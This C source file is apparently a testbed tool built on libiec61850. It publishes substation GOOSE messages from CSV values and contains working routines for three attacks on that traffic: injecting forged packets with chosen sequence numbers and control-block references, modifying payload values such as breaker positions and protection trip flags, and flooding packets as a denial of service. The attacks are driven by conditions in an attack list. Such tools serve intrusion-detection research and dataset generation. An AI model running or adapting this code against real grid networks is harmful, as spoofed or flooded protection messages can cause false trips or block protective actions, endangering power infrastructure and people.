/*
 * goose_publisher_example.c
 */

#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <stdio.h>
#include <sys/time.h>
#include "goose_publisher_toolchain.h"
#include <unistd.h>
#include "ied_server_private.h"
#include "mms_goose.h"
#include "../src/iec61850/server/mms_mapping/mms_goose.c"
#include <pthread.h>


#define CSVFILENAME "value.csv"
/* import IEC 61850 device model created from SCL-File */
extern IedModel iedModel;
static IedServer iedServer = NULL;

bool enableInsertAttack=true;
bool enableModifyAttack=true;
bool enableDosAttack=true;
int executedInsertAttackCount=0;
int executedModifyAttackCount=0;
int executedDosAttackCount=0;
double updatePayloadInterval;
struct AttackList* attackList;
clock_t beginTime;
bool firstPublishGoose=true;
char **results;
// has to be executed as root!
int main(int argc, char **argv) {
	char *interface;
	//double nextUpdatePayloadTime=getTime()+1;
	double nextUpdatePayloadTime;
	int port;
	char *folder;
    double programDuration=30;
    updatePayloadInterval=(iedModel.gseCBs->maxTime+iedModel.gseCBs->minTime)/(2*1000);

	if (argc > 2) {
		interface = "lo";
		nextUpdatePayloadTime = getTime() + 1;
		port = 102;
		folder = argv[4];

		/*
		 * interface = argv[1];
		 nextUpdatePayloadTime=atof(argv[2]);
		 port=atoi(argv[3]);
		 folder=argv[4];
		 * */
		//printf("c time is %.3f", getTime());
	} else {
		printf(
				"Use as: sudo ./goose_publisher_toolchain interfaceID currentTimestamp folderName");
	}
	printf("Using interface %s\n", interface);
	//beginTime= clock();
	iedServer = IedServer_create(&iedModel);
	IedServer_setGooseInterfaceId(iedServer, interface);
	IedServer_start(iedServer, port);
	if (!IedServer_isRunning(iedServer)) {
		printf("Starting server failed! Exit.\n");
		IedServer_destroy(iedServer);
		exit(-1);
	}


	/* Start GOOSE publishing */
	IedServer_enableGoosePublishing(iedServer);

	/*prepare csv reading*/
	/*char relatedCSVFileName[100];
	 strcpy (relatedCSVFileName,folder);
	 strcat (relatedCSVFileName,"/");
	 strcat (relatedCSVFileName,CSVFILENAME);
	 FILE *stream = fopen(relatedCSVFileName, "r");*/
	FILE *stream = fopen(CSVFILENAME, "r");
	char cwd[100];
	/*if (getcwd(cwd, sizeof(cwd)) != NULL) {
		printf("Current working dir: %s\n", cwd);
	}*/
	if (stream == NULL) {
		printf("Cannot load csv file.\n");
		exit(-1);

	}

	// Read attack infor from xml file.
    attackList=getAttackList();



	char *buffer;
	size_t bufsize = 1024;
	size_t characters;
	buffer = (char*) malloc(bufsize * sizeof(char));
	int lineSize = 0;

	//update packets value basing on csv file.
	int running = 1;
	char **lastResult;
	char * lastBuffer;
	lastBuffer=(char*) malloc(bufsize * sizeof(char));
	beginTime= clock();
	printf("start time is %f\n",getRuningTime());
	while (getRuningTime()<programDuration) {
		//printf("iterate time is %f\n",getRuningTime());
		lineSize = getline(&buffer, &bufsize, stream);
		if (lineSize != -1) { //read a new line from csv
			char *tmp = strdup(buffer);
			results = getfield(tmp);
			if(firstPublishGoose){//if this is the first time loop , no need to update St Sq number.
				firstPublishGoose=false;
				strcpy(lastBuffer, buffer);
			}else{// manually update: stnum++, sqnum=0, if value changed, updateStNum. otherwise, sq++ st keeps the same value.
				if(strcmp(buffer,lastBuffer)){ //if current and history buff is different, update st++
					updateStNum(iedServer);
					//printf("update st\n");
				}else{
					//printf("not update st!\n");
				}
				strcpy(lastBuffer, buffer);
			}
			//launch modify attack
			if(enableModifyAttack){
				launchModifyAttack(iedServer,results);
			}

			/*while (1) {
					if (getTime() > nextUpdatePayloadTime) {
						nextUpdatePayloadTime = nextUpdatePayloadTime + updatePayloadInterval;
						break;
					}
			}*/
			assignPayloadValue();
			while (1) {
					if (getTime() > nextUpdatePayloadTime) {
						nextUpdatePayloadTime = nextUpdatePayloadTime + updatePayloadInterval;
						break;
					}
			}

			if (enableInsertAttack) {
				//printf("calling launchInsertAttack\n");
				launchInsertAttack(iedServer,results);
			}
			//launch DoS attack
			if(enableDosAttack){
				launchDoSAttack(iedServer,results);
			}

			free(tmp);
			free(results);
		}

	}
	printf("running time is %f\n",getRuningTime());
	exit(0);

}
bool stobool(const char *value) {
	if (strcmp(value, "True") == 0 || strcmp(value, "TRUE") == 0
			|| strcmp(value, "true") == 0 || strcmp(value, "T") == 0) {
		return true;
	} else if (strcmp(value, "False") == 0 || strcmp(value, "FALSE") == 0
			|| strcmp(value, "false") == 0 || strcmp(value, "F") == 0) {
		return false;
	}
	printf("invalid true/false input: %s, return false \n", value);
	return false;
}

const char** getfield(char *line) {
	int init_size = strlen(line);
	char delim[] = ",";

	char *ptr = strtok(line, delim);
	//printf("%s\n", line);
	char **results;
	results = (char**) malloc(sizeof(char*) * 30);//todo: size should be dynamic setting by the column numbers.
	int i = 0;
	while (ptr != NULL) {
		results[i] = malloc(sizeof(char) * 20);
		if (!results[i]) {
			printf("malloc failed\n");
		} else {
			results[i] = ptr;
		}
		i++;
		ptr = strtok(NULL, delim);

	}
	return results;
}
double getTime() {
	// to control time in millionsecond
	struct timeval start;
	double secs = 0;
	gettimeofday(&start, NULL);
	secs = (float) start.tv_usec / 1000000;
	secs += start.tv_sec;
	return secs;
}

void updateStNum(IedServer iedserver) {
	LinkedList element = iedserver->mmsMapping->gseControls;
	while ((element = LinkedList_getNext(element)) != NULL) {
		MmsGooseControlBlock gcb = (MmsGooseControlBlock) element->data;
		GoosePublisher publisher = gcb->publisher;
		GoosePublisher_increaseStNum(publisher);
	}
}
void launchInsertAttack(IedServer iedserver, char **results) {
	LinkedList element = iedserver->mmsMapping->gseControls;
	while ((element = LinkedList_getNext(element)) != NULL) {
		MmsGooseControlBlock gcb = (MmsGooseControlBlock) element->data;
		GoosePublisher publisher = gcb->publisher;
		int index = 0;
		struct InsertAttack *currentAttack;
		if (attackList->insertAttackNum != 0) {
			while (index<attackList->insertAttackNum&&attackList->insertAttackList[index]->valid==true) {
				currentAttack = attackList->insertAttackList[index];
				if (!currentAttack->executed) {
					if (currentAttack->condition_type == CONDITION_ST_SQ_GCB) {
						if (GoosePublisher_getStNum(publisher)== currentAttack->condition_st&& (GoosePublisher_getSqNum(publisher) - 1)== currentAttack->condition_sq&& !strcmp(gcb->name,currentAttack->condition_gcb)) {
							insertPacket(currentAttack);
							attackList->insertAttackList[index]->executed =true;
							executedInsertAttackCount++;
						}
					} else if (currentAttack->condition_type == CONDITION_TIME) {
						if (getRuningTime()>= (currentAttack->condition_time)) {
							printf("try to insert Packet at %f\n",getRuningTime());
							insertPacket(currentAttack);
							attackList->insertAttackList[index]->executed =true;
							executedInsertAttackCount++;
						}
					} else if (currentAttack->condition_type== CONDITION_PAYLOAD) {
						if ((!strcmp(gcb->name, currentAttack->condition_gcb))&& payloadConditionTrigger(currentAttack->condition_payloads,results)) {
							printf("trigger insert attack by condition_payload\n");
							insertPacket(currentAttack);
							attackList->insertAttackList[index]->executed =true;
							executedInsertAttackCount++;
						}
					}
				}
				if (attackList->insertAttackNum == executedInsertAttackCount) {
					enableInsertAttack = false;
				}
				index++;
			}
		} else {
			enableInsertAttack = false;
		}
	}
}
void insertPacket(struct InsertAttack* iAttack) {

	printf("insert a packet\n");

	LinkedList dataSetValues = LinkedList_create();
	int valueIndex=0;
	while(strlen(iAttack->values[valueIndex].value)!=0){
		struct InsertAttackValue currentValue=iAttack->values[valueIndex++];
		if(!strcmp(currentValue.type,"integer")){
			LinkedList_add(dataSetValues, MmsValue_newIntegerFromInt32(atoi(currentValue.value)));
		}else if(!strcmp(currentValue.type,"string")){
			LinkedList_add(dataSetValues, MmsValue_newVisibleString(currentValue.value));
		}else if(!strcmp(currentValue.type,"boolean")){
			bool binValue=false;
			if(!strcmp(currentValue.value,"true")){
				binValue=true;
			}
			LinkedList_add(dataSetValues, MmsValue_newBoolean(binValue));

		}else if(!strcmp(currentValue.type,"float")){
			LinkedList_add(dataSetValues,MmsValue_newFloat(atof(currentValue.value)));
		}
	}


	CommParameters gooseCommParameters;

	gooseCommParameters.appId = iAttack->appId;
	gooseCommParameters.dstAddress[0] = getHexFromString(0,iAttack->dstAddress);
	gooseCommParameters.dstAddress[1] = getHexFromString(2,iAttack->dstAddress);
	gooseCommParameters.dstAddress[2] = getHexFromString(4,iAttack->dstAddress);
	gooseCommParameters.dstAddress[3] = getHexFromString(6,iAttack->dstAddress);
	gooseCommParameters.dstAddress[4] = getHexFromString(8,iAttack->dstAddress);
	gooseCommParameters.dstAddress[5] = getHexFromString(10,iAttack->dstAddress);
	gooseCommParameters.vlanId = iAttack->vlanId;
	gooseCommParameters.vlanPriority = iAttack->vlanPriority;;

	GoosePublisher publisher = GoosePublisher_create(&gooseCommParameters,iAttack->interface);

	GoosePublisher_setStNum(publisher,iAttack->stNum);
	GoosePublisher_setSqNum(publisher,iAttack->sqNum);

	GoosePublisher_setGoCbRef(publisher,iAttack->gocbRef );
	GoosePublisher_setConfRev(publisher, 1);
	GoosePublisher_setDataSetRef(publisher, iAttack->dataSet);
	printf("publishing inserted Packet at %f\n", getRuningTime());
	if (GoosePublisher_publish(publisher, dataSetValues) == -1) {
		printf("Error sending message!\n");
	}
	printf("**************finish inserted Packet at %f\n", getRuningTime());
	GoosePublisher_destroy(publisher);

	LinkedList_destroyDeep(dataSetValues,(LinkedListValueDeleteFunction) MmsValue_delete);

}
void launchDoSAttack(IedServer iedserver, char **results) {
	LinkedList element = iedserver->mmsMapping->gseControls;
	while ((element = LinkedList_getNext(element)) != NULL) {
		MmsGooseControlBlock gcb = (MmsGooseControlBlock) element->data;
		GoosePublisher publisher = gcb->publisher;
		int index = 0;
		struct DosAttack *currentAttack;
		if (attackList->dosAttackNum != 0) {
			while (index<attackList->dosAttackNum&&attackList->dosAttackList[index]->valid==true) {
				currentAttack = attackList->dosAttackList[index];
				if (!currentAttack->executed) {
					if (currentAttack->condition_type == CONDITION_ST_SQ_GCB) {
						if (GoosePublisher_getStNum(publisher)== currentAttack->condition_st
								&& GoosePublisher_getSqNum(publisher) - 1== currentAttack->condition_sq
								&& !strcmp(gcb->name,currentAttack->condition_gcb)) {
							createDoSAttackThread(currentAttack);
							attackList->dosAttackList[index]->executed = true;
							executedDosAttackCount++;
						}
					} else if (currentAttack->condition_type == CONDITION_TIME) {
						if (getRuningTime()> (currentAttack->condition_time- updatePayloadInterval)) {
							createDoSAttackThread(currentAttack);
							attackList->dosAttackList[index]->executed = true;
							executedDosAttackCount++;
						}
					} else if (currentAttack->condition_type== CONDITION_PAYLOAD) {
						if ((!strcmp(gcb->name, currentAttack->condition_gcb))
								&& payloadConditionTrigger(currentAttack->condition_payloads,results)) {
							printf("trigger insert attack by condition_payload\n");
							createDoSAttackThread(currentAttack);
							attackList->dosAttackList[index]->executed = true;
							executedDosAttackCount++;
						}
					}
				}
				if (attackList->dosAttackNum == executedDosAttackCount) {
					enableDosAttack = false;
				}
				index++;
			}
		} else {
			enableDosAttack = false;
		}
	}
}
void createDoSAttackThread(struct DosAttack* dAttack){
	printf("this is dos attack--create thread\n");
	pthread_t tid_1;
	pthread_create(&tid_1, NULL, sendDosAttackPacket, (void *)dAttack);
	pthread_join(tid_1, NULL);
}

void* sendDosAttackPacket(void *dAttack) {
	printf("this is dos attack---run\n");
	struct DosAttack *attackPointer = (struct DosAttack*) dAttack;
	struct DosAttack attack=*attackPointer;
	LinkedList dataSetValues = LinkedList_create();
	int valueIndex = 0;
	while (strlen(attack.values[valueIndex].value) != 0) {
		struct DosAttackValue currentValue = attack.values[valueIndex++];
		if (!strcmp(currentValue.type, "integer")) {
			LinkedList_add(dataSetValues,
					MmsValue_newIntegerFromInt32(atoi(currentValue.value)));
		} else if (!strcmp(currentValue.type, "string")) {
			LinkedList_add(dataSetValues,
					MmsValue_newVisibleString(currentValue.value));
		} else if (!strcmp(currentValue.type, "boolean")) {
			bool binValue = false;
			if (!strcmp(currentValue.value, "true")) {
				binValue = true;
			}
			LinkedList_add(dataSetValues, MmsValue_newBoolean(binValue));

		} else if (!strcmp(currentValue.type, "float")) {
			LinkedList_add(dataSetValues,
					MmsValue_newFloat(atof(currentValue.value)));
		}
	}

	CommParameters gooseCommParameters;

	gooseCommParameters.appId = attack.appId;
	gooseCommParameters.dstAddress[0] = getHexFromString(0, attack.dstAddress);
	gooseCommParameters.dstAddress[1] = getHexFromString(2, attack.dstAddress);
	gooseCommParameters.dstAddress[2] = getHexFromString(4, attack.dstAddress);
	gooseCommParameters.dstAddress[3] = getHexFromString(6, attack.dstAddress);
	gooseCommParameters.dstAddress[4] = getHexFromString(8, attack.dstAddress);
	gooseCommParameters.dstAddress[5] = getHexFromString(10,attack.dstAddress);
	gooseCommParameters.vlanId = attack.vlanId;
	gooseCommParameters.vlanPriority = attack.vlanPriority;
	;

	GoosePublisher publisher = GoosePublisher_create(&gooseCommParameters,attack.interface);

	GoosePublisher_setStNum(publisher, attack.stNum);
	GoosePublisher_setSqNum(publisher, attack.sqNum);

	GoosePublisher_setGoCbRef(publisher, attack.gocbRef);
	GoosePublisher_setConfRev(publisher, 1);
	GoosePublisher_setDataSetRef(publisher, attack.dataSet);

	int j;
	for(j=0;j<attack.stopCondition_packetNum;j++){
	//for(j=0;j<100;j++){
		if (GoosePublisher_publish(publisher, dataSetValues) == -1) {
				printf("Error sending message!\n");
		}
	}
	GoosePublisher_destroy(publisher);

	LinkedList_destroyDeep(dataSetValues,
			(LinkedListValueDeleteFunction) MmsValue_delete);
	printf("stop DoS thread\n");
	pthread_exit(0);
}


void launchModifyAttack(IedServer iedserver, char **array) {
	LinkedList element = iedserver->mmsMapping->gseControls;
	while ((element = LinkedList_getNext(element)) != NULL) {

		MmsGooseControlBlock gcb = (MmsGooseControlBlock) element->data;
		GoosePublisher publisher = gcb->publisher;
		int index = 0;
		struct ModifyAttack *currentAttack;
		if (attackList->modifyAttackNum != 0) {
			while (index<attackList->modifyAttackNum&&attackList->modifyAttackList[index]->valid==true) {
				currentAttack = attackList->modifyAttackList[index];
				if (!currentAttack->executed) {
					if (currentAttack->condition_type == CONDITION_ST_SQ_GCB) {
						if (GoosePublisher_getStNum(publisher)== currentAttack->condition_st&& GoosePublisher_getSqNum(publisher)== currentAttack->condition_sq&& !strcmp(gcb->name,currentAttack->condition_gcb)) {
							printf("try to modify attack\n");
							ModifyArray(array, currentAttack);
							attackList->modifyAttackList[index]->executed =true;
							executedModifyAttackCount++;
							//break;
						}
					} else if (currentAttack->condition_type == CONDITION_TIME) {
						if (getRuningTime()> (currentAttack->condition_time- updatePayloadInterval)) {
							ModifyArray(array, currentAttack);
							attackList->modifyAttackList[index]->executed =true;
							executedModifyAttackCount++;
							//break;
						}
					} else if (currentAttack->condition_type== CONDITION_PAYLOAD) {
						if ((!strcmp(gcb->name, currentAttack->condition_gcb))&& payloadConditionTrigger(currentAttack->condition_payloads,array)) {
							printf("trigger modify attack by condition_payload\n");
							ModifyArray(array, currentAttack);
							attackList->modifyAttackList[index]->executed =true;
							executedModifyAttackCount++;
						}
					}
				}
				if (attackList->modifyAttackNum == executedModifyAttackCount) {
					enableModifyAttack = false;
				}
				index++;
			}
		} else {
			enableModifyAttack = false;
		}

	}
}
void ModifyArray(char** array,struct ModifyAttack* mAttack){
	int i=0;
	while(mAttack->modifications[i].arrayIndex>0){
		(array[mAttack->modifications[i].arrayIndex-1])=(mAttack->modifications[i].modifiedvalue);
		i++;
	}
	int j=0;
	while(j<10){

		printf("array %d:%s\n",j,array[j]);
		j++;
	}
}
void ModifyArrayTriggerByTime(struct ModifyAttack* mAttack){
	//char ** array=getResults();
	int i=0;
	while(mAttack->modifications[i].arrayIndex>0){
		(results[mAttack->modifications[i].arrayIndex-1])=(mAttack->modifications[i].modifiedvalue);
		i++;
	}
	int j=0;
	while(j<10){

		printf("!array %d:%s\n",j,results[j]);
		j++;
	}
	assignPayloadValue();
}

double getRuningTime(){
	clock_t currentTime = clock();
	double spent = (double)(currentTime - beginTime) / CLOCKS_PER_SEC;
	return spent;

}
int getHexFromString(int index,char * string){
	char* substr = malloc(2);
	strncpy(substr, string+index, 2);
	int number = (int)strtol(substr, NULL, 16);
	free(substr);
	return number;
}
bool payloadConditionTrigger(struct PayloadCondition condition_payloads[MAXIMUM_CONDITION_PAYLOAD_SIZE],char **results){
	int i=0;
	bool returnValue=true;
	while(condition_payloads[i].index>0){
		struct PayloadCondition current_payload=condition_payloads[i];
		if(!strcmp(current_payload.type,"string")){
			if(strcmp(results[current_payload.index-1],current_payload.value)){
				returnValue=false;
				break;
			}
		}else if(!strcmp(current_payload.type,"numeric")){
			float pValue=atof(current_payload.value);
			float rValue=atof(results[current_payload.index-1]);
			if(!strcmp(current_payload.operator,"bigger")){
				if(!(rValue>pValue)){
					returnValue=false;
					break;
				}
			}else if(!strcmp(current_payload.operator,"smaller")){

				if(!(rValue<pValue)){
					returnValue=false;
					break;
				}
			}else if(!strcmp(current_payload.operator,"equal")){
				if(!(rValue==pValue)){
					returnValue=false;
					break;
				}
			}
		}else if(!strcmp(current_payload.type,"boolean")){
			bool pValue=stobool(current_payload.value);
			bool rValue=stobool(results[current_payload.index-1]);
			if(!(pValue==rValue)){
				returnValue=false;
				break;
			}
		}
		i++;
	}
	return returnValue;

}
char ** getResults(){
	return results;
}
void assignPayloadValue(){
	IedServer_lockDataModel(iedServer); //Lock the MMS server data model.Client requests will be postponed until the lock is removed.
	//Insert generated code here
	IedServer_updateInt32AttributeValue(iedServer,
	IEDMODEL_CTRL_XCBR_Pos_stVal, atoi(results[0]));
	IedServer_updateInt32AttributeValue(iedServer,
	IEDMODEL_CTRL_XSWI_Pos_stVal, atoi(results[1]));
	IedServer_updateInt32AttributeValue(iedServer,
	IEDMODEL_CTRL_XSWI_Pos_stVal, atoi(results[2]));
	IedServer_updateInt32AttributeValue(iedServer,
	IEDMODEL_CTRL_PTRC_EEHealth_stVal, atoi(results[3]));
	IedServer_updateBooleanAttributeValue(iedServer,
	IEDMODEL_CTRL_XCBR_Loc_stVal, stobool(results[4]));
	IedServer_updateBooleanAttributeValue(iedServer,
	IEDMODEL_PROT_PIOC_Op_general, stobool(results[5]));
	IedServer_updateInt32AttributeValue(iedServer,
	IEDMODEL_PROT_XCBR_EEHealth_stVal, atoi(results[6]));
	IedServer_updateBooleanAttributeValue(iedServer,
	IEDMODEL_PROT_LPHD_PwrSupAlm_stVal, stobool(results[7]));
	IedServer_updateBooleanAttributeValue(iedServer,
	IEDMODEL_PROT_PSCH_ProTx_stVal, stobool(results[8]));
	IedServer_updateBooleanAttributeValue(iedServer,
	IEDMODEL_PROT_PSCH_ProRx_stVal, stobool(results[9]));
	IedServer_updateFloatAttributeValue(iedServer,
	IEDMODEL_MEAS_MMXU_A_phsA_instCVal_mag_f, atof(results[10]));
	IedServer_updateFloatAttributeValue(iedServer,
	IEDMODEL_MEAS_MMXU_A_phsB_instCVal_mag_f, atof(results[11]));
	IedServer_updateFloatAttributeValue(iedServer,
	IEDMODEL_MEAS_MMXU_A_phsC_instCVal_mag_f, atof(results[12]));
	IedServer_updateFloatAttributeValue(iedServer,
	IEDMODEL_MEAS_MMXU_PhV_phsA_instCVal_mag_f, atof(results[13]));
	IedServer_updateFloatAttributeValue(iedServer,
	IEDMODEL_MEAS_MMXU_PhV_phsB_instCVal_mag_f, atof(results[14]));
	IedServer_updateFloatAttributeValue(iedServer,
	IEDMODEL_MEAS_MMXU_PhV_phsC_instCVal_mag_f, atof(results[15]));
	IedServer_updateFloatAttributeValue(iedServer,
	IEDMODEL_MEAS_MMXU_TotW_instMag_f, atof(results[16]));
	IedServer_updateFloatAttributeValue(iedServer,
	IEDMODEL_MEAS_MMXU_TotVAr_instMag_f, atof(results[17]));
	IedServer_updateFloatAttributeValue(iedServer,
	IEDMODEL_MEAS_MMXU_Hz_instMag_f, atof(results[18]));
	IedServer_updateFloatAttributeValue(iedServer,
	IEDMODEL_MEAS_MMXU_TotPF_instMag_f, atof(results[19]));
	//End of insert code
	IedServer_unlockDataModel(iedServer);
}
